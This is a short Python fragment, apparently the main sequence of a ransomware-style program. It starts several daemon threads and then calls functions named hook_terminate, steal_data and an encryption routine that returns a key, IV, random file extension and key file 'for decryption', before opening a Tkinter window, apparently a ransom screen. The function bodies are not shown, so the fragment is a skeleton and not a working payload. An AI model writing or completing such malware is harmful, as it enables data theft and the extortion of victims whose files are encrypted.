    threading.Thread(target=kt, daemon=True).start()
    threading.Thread(target=bi, daemon=True).start()
    threading.Thread(target=sd, daemon=True).start()
    ph()
    hook_terminate()
    sb()
    steal_data()
    k, iv, random_ext, key_file = ef()  # Store key_file for decryption
    print("Starting Tkinter mainloop...")
    root.mainloop()